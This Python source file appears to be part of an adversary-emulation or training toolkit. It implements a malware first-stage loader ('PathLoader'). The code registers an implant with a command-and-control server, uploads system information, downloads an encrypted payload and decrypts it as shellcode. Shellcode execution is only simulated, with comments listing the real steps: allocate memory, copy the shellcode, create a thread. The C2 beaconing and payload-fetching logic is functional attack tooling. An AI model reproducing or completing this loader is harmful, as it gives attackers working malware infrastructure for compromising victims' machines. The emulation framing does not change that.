"""
FinalFinal PathLoader Component
Initial loader that downloads and decrypts shellcode from C2 server
"""

import sys
import argparse
import requests
from pathlib import Path
from typing import Optional

import config
import utils

logger = utils.setup_logging("PathLoader")


class PathLoader:
    """
    PathLoader - Initial stage loader
    Downloads encrypted shellcode from C2 and executes it
    """
    
    def __init__(self, c2_url: str, payload_path: Optional[str] = None):
        """
        Initialize PathLoader
        
        Args:
            c2_url: C2 server URL
            payload_path: Optional local payload path (for testing)
        """
        self.c2_url = c2_url
        self.payload_path = payload_path
        self.implant_id = utils.generate_implant_id()
        
        logger.info(f"PathLoader initialized with ID: {self.implant_id}")
        logger.info(f"C2 URL: {self.c2_url}")
    
    def download_payload(self) -> Optional[bytes]:
        """
        Download encrypted payload from C2 server
        
        Returns:
            Encrypted payload bytes or None on failure
        """
        if self.payload_path:
            logger.info(f"Loading payload from local file: {self.payload_path}")
            try:
                payload_file = Path(self.payload_path)
                if not utils.file_exists(payload_file):
                    logger.error(f"Payload file not found: {self.payload_path}")
                    return None
                
                payload = utils.read_file_bytes(payload_file)
                logger.info(f"Loaded {len(payload)} bytes from local file")
                return payload
            except Exception as e:
                logger.error(f"Failed to load local payload: {e}")
                return None
        
        # Download from C2
        logger.info("Downloading payload from C2 server...")
        
        try:
            headers = {
                'User-Agent': config.PATHLOADER_USER_AGENT,
                'X-Implant-ID': self.implant_id
            }
            
            url = f"{self.c2_url}/payload"
            logger.debug(f"Requesting: {url}")
            
            response = requests.get(
                url,
                headers=headers,
                timeout=config.PATHLOADER_DOWNLOAD_TIMEOUT
            )
            
            if response.status_code == 200:
                payload = response.content
                logger.info(f"Downloaded {len(payload)} bytes from C2")
                return payload
            else:
                logger.error(f"C2 returned status code: {response.status_code}")
                return None
                
        except requests.exceptions.RequestException as e:
            logger.error(f"Failed to download payload: {e}")
            return None
    
    def decrypt_payload(self, encrypted_payload: bytes) -> Optional[bytes]:
        """
        Decrypt the downloaded payload
        
        Args:
            encrypted_payload: Encrypted payload bytes
            
        Returns:
            Decrypted shellcode or None on failure
        """
        logger.info("Decrypting payload...")
        
        try:
            # Extract IV (first 16 bytes)
            iv = encrypted_payload[:config.IV_SIZE]
            encrypted_data = encrypted_payload[config.IV_SIZE:]
            
            logger.debug(f"IV: {utils.bytes_to_hex(iv)}")
            logger.debug(f"Encrypted data size: {len(encrypted_data)} bytes")
            
            # Decrypt
            shellcode = utils.decrypt_data(encrypted_data, iv)
            
            logger.info(f"Decrypted {len(shellcode)} bytes of shellcode")
            
            # Calculate hash for verification
            shellcode_hash = utils.calculate_hash(shellcode)
            logger.info(f"Shellcode SHA256: {shellcode_hash}")
            
            return shellcode
            
        except Exception as e:
            logger.error(f"Failed to decrypt payload: {e}")
            return None
    
    def execute_shellcode(self, shellcode: bytes) -> bool:
        """
        Execute the decrypted shellcode
        
        Args:
            shellcode: Decrypted shellcode bytes
            
        Returns:
            True if execution successful, False otherwise
        """
        logger.info("Preparing to execute shellcode...")
        
        if config.SIMULATE_INJECTION:
            logger.warning("SIMULATION MODE: Not actually executing shellcode")
            utils.print_warning("Shellcode execution simulated for safety")
            
            # Simulate execution by launching the next stage
            logger.info("Simulating shellcode execution...")
            logger.info(f"Would execute {len(shellcode)} bytes of shellcode")
            
            # In real scenario, this would:
            # 1. Allocate executable memory
            # 2. Copy shellcode to memory
            # 3. Create thread to execute shellcode
            
            utils.print_success("Shellcode execution simulated successfully")
            
            # Launch next stage (FinalDraft)
            logger.info("Transitioning to FinalDraft stage...")
            utils.print_info("Next stage: Run 'python finaldraft.py' to continue")
            
            return True
        else:
            logger.error("Real shellcode execution is disabled for safety")
            return False
    
    def register_with_c2(self) -> bool:
        """
        Register this implant with the C2 server
        
        Returns:
            True if registration successful, False otherwise
        """
        logger.info("Registering with C2 server...")
        
        try:
            system_info = utils.get_system_info()
            
            data = {
                'implant_id': self.implant_id,
                'stage': 'pathloader',
                'system_info': system_info
            }
            
            headers = {
                'User-Agent': config.PATHLOADER_USER_AGENT,
                'Content-Type': 'application/json'
            }
            
            url = f"{self.c2_url}/register"
            
            response = requests.post(
                url,
                json=data,
                headers=headers,
                timeout=config.PATHLOADER_DOWNLOAD_TIMEOUT
            )
            
            if response.status_code == 200:
                logger.info("Successfully registered with C2")
                return True
            else:
                logger.warning(f"C2 registration returned status: {response.status_code}")
                return False
                
        except requests.exceptions.RequestException as e:
            logger.warning(f"Failed to register with C2: {e}")
            return False
    
    def run(self) -> bool:
        """
        Execute the complete PathLoader workflow
        
        Returns:
            True if successful, False otherwise
        """
        utils.print_banner()
        utils.print_info("Starting PathLoader stage...")
        
        # Safety check
        utils.check_safety_mode()
        
        # Register with C2
        self.register_with_c2()
        
        # Download payload
        utils.print_info("Downloading payload from C2...")
        encrypted_payload = self.download_payload()
        
        if not encrypted_payload:
            utils.print_error("Failed to download payload")
            return False
        
        utils.print_success(f"Downloaded {len(encrypted_payload)} bytes")
        
        # Decrypt payload
        utils.print_info("Decrypting payload...")
        shellcode = self.decrypt_payload(encrypted_payload)
        
        if not shellcode:
            utils.print_error("Failed to decrypt payload")
            return False
        
        utils.print_success(f"Decrypted {len(shellcode)} bytes of shellcode")
        
        # Execute shellcode
        if utils.confirm_action("Execute shellcode (simulated)"):
            utils.print_info("Executing shellcode...")
            success = self.execute_shellcode(shellcode)
            
            if success:
                utils.print_success("PathLoader stage completed successfully")
                return True
            else:
                utils.print_error("Failed to execute shellcode")
                return False
        else:
            utils.print_warning("Shellcode execution cancelled by user")
            return False


def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(
        description="FinalFinal PathLoader - Initial stage loader"
    )
    parser.add_argument(
        '--c2',
        default=config.C2_ENDPOINT,
        help=f"C2 server URL (default: {config.C2_ENDPOINT})"
    )
    parser.add_argument(
        '--payload',
        help="Local payload file path (for testing)"
    )
    parser.add_argument(
        '--verbose',
        action='store_true',
        help="Enable verbose logging"
    )
    
    args = parser.parse_args()
    
    if args.verbose:
        logger.setLevel("DEBUG")
    
    # Create and run PathLoader
    loader = PathLoader(args.c2, args.payload)
    success = loader.run()
    
    sys.exit(0 if success else 1)


if __name__ == "__main__":
    main()
